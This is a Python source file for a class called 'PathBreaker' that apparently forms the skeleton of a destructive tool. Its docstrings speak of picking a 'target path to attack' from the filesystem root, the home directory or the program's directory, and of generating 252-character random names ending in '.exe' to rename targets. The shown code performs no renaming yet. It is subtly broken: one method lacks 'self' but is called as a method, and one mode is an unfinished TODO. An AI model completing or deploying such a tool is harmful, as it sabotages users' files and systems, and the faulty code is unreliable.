import secrets
import string
import pathlib
import os
import sys

class PathBreaker:

    def __init__(self, debug:bool=True):
        self.debug = debug
        self.program_format = self._exe_or_py()
        self.program_path = self._get_script_path()
        self.program_dir = os.path.dirname(self.program_path)

    #==================
    # PRE CONFIG FUNC #
    #==================
    def _exe_or_py(self):
        """
        Check whether the program is being interpreted or compiled.
        """
        if getattr(sys, 'frozen', False):
            return 'exe'
        else:
            return 'py'
        
    def _get_script_path(self):
        """
        Return the path of the program
        """
        if self.program_format == 'exe':
            return sys.executable
        elif self.program_format == 'py':
            return os.path.abspath(__file__)
        else:
            return

    #==============
    # CONFIG FUNC #
    #==============
    def _select_target(self, mode:int):
        """Select the target path to attack

        Args:
            mode (int): Tool target mode
                mode 1: From / 
                mode 2: From ~
                mode 3: From the current dir
                mode 4: From custom path

        Returns:
            path: target path
        """
        if mode == 1:
            return pathlib.Path(os.path.abspath(os.sep))
        elif mode == 2:
            return pathlib.Path(os.path.expanduser("~"))
        elif mode == 3:
            return self.program_dir
        elif mode == 4:
            # TODO add custom path mode
            return
        else:
            return
    
    #=================
    # NAME GENERATOR #
    #=================
    def _gen_trash_name(length: int = 252):
        """Generate a random name

        Args:
            length (int, optional): length of the name. Defaults to 252.

        Returns:
            str: new name
        """
        alphabet = string.ascii_letters + string.digits
        return ''.join(secrets.choice(alphabet) for _ in range(length))
    
    def gen_name(self, mode:int=1, name:str=None, tag:str=None, extension:str='exe', lenght:int=None):
        """Generate the final name for file

        Args:
            mode (int, optional): Random(1) or Custom(2) mode. Defaults to 1.
            name (str, optional): Custom name for second mode. Defaults to None.
            tag (str, optional): _description_. Defaults to None.
            extension (str, optional): The extension for the full filename. Defaults to 'exe'.
            lenght (int, optional): Lenght of the random name. Defaults to None (252 in the called func).

        Returns:
            name: A new name for rename the target 
        """
        # Tag management
        if tag:
            tag = str(tag)
        else:
            tag = ''
        # Random mode
        if mode == 1:
            if lenght is None:
                name = self._gen_trash_name()+tag+'.'+extension
            else:
                name = self._gen_trash_name(length=lenght)+tag+'.'+extension            
            return name
        # Custom mode
        elif mode == 2:
            if name is None:
                name = "Noname"
            name = name+tag+'.'+extension
            return name